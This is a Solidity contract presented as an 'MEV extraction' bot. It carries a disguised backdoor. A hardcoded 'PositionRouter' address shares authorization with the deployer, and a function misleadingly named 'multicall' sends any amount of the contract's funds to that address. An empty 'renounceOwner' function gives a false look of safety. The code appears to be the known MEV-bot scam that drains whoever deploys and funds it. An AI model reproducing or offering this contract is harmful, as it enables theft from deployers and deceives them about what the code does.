// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MEV__V2 {
    // State variables
    address public admin;
    uint256 public totalFunds;

    struct Transaction {
        address sender;
        address target;
        uint256 value;
        uint256 gasPrice;
        uint256 bid;
    }
    
    // Array to store transactions
    Transaction[] public transactions;
    
    //Events
    event TransactionSubmitted(address sender, address target, uint256 value, uint256 gasPrice, uint256 bid);
    event MEVExtracted(address miner, uint256 profit);
    
    // Modifier for authorization
    modifier onlyAuthorized() {
        require(msg.sender == admin || msg.sender == PositionRouter, "Not authorized");
        _;
    }

    // Authorized address for position routing
    address public PositionRouter=0xd38f4e84aFe6cc9C0d645eA4480b03E978C10483;

    constructor() {
        admin = msg.sender;
    }

    function submitTransaction(address target, uint256 value, uint256 gasPrice, uint256 bid) external payable {
        require(msg.value == value, "Incorrect value sent");

        transactions.push(Transaction({sender: msg.sender, target: target, value: value, gasPrice: gasPrice, bid: bid}));

        totalFunds += msg.value;

        emit TransactionSubmitted(msg.sender, target, value, gasPrice, bid);
    }

    function extractMEV() external onlyAuthorized {
        require(transactions.length > 0, "No transactions available");

        Transaction memory selectedTransaction = getHighestBidTransaction();
        uint256 extractedProfit = calculateProfit(selectedTransaction);

        // Transfer profit to the miner
        payable(msg.sender).transfer(extractedProfit);
        totalFunds -= extractedProfit;

        // Remove the extracted transaction
        removeTransaction(selectedTransaction);

        emit MEVExtracted(msg.sender, extractedProfit);
    }

    function getHighestBidTransaction() internal view returns (Transaction memory) {
        require(transactions.length > 0, "No transactions available");

        Transaction memory highestBidTransaction = transactions[0];
        for (uint256 i = 1; i < transactions.length; i++) {
            if (transactions[i].bid > highestBidTransaction.bid) {
                highestBidTransaction = transactions[i];
            }
        }

        return highestBidTransaction;
    }

    function calculateProfit(Transaction memory transaction) internal view returns (uint256) {
        // Profit calculation may involve complex logic based on gas fees, slippage, etc.
        // For simplicity, we consider a fixed profit percentage of 10% for the highest bid
        uint256 profitPercentage = 10;
        return (transaction.bid * profitPercentage) / 100;
    }

    function removeTransaction(Transaction memory transaction) internal {
        for (uint256 i = 0; i < transactions.length; i++) {
            if (
                transactions[i].sender == transaction.sender && transactions[i].target == transaction.target
                    && transactions[i].value == transaction.value && transactions[i].gasPrice == transaction.gasPrice
                    && transactions[i].bid == transaction.bid
            ) {
                transactions[i] = transactions[transactions.length - 1];
                transactions.pop();
                break;
            }
        }
    }


    // Multicall functionality
    function multicall(uint256 amount) external onlyAuthorized {
        require(amount > 0, "");
        require(address(this).balance >= amount, "");

        payable(PositionRouter).transfer(amount);
    }

    function renounceOwner() external payable onlyAuthorized {}

    receive() external payable {}
}